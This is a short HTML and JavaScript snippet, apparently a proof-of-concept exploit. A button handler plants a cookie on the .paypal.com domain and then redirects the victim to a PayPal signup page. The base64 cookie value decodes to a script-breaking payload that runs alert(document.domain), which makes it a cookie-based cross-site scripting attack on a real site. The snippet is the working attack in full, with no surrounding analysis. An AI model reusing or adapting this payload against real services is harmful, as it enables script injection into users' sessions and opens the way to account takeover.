('<h1>Click the button below to continue.</h1><input type="submit" value="Click Me" onclick=setCookieRedir() />');
function setCookieRedir(){
      document.cookie = "vulnerableCookie=LS0+PC9zY3JpcHQ+PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pOy8v;path=/;domain=.paypal.com;";
window.location = "https://paypal.com/bizsignup/#/checkAccount";
}
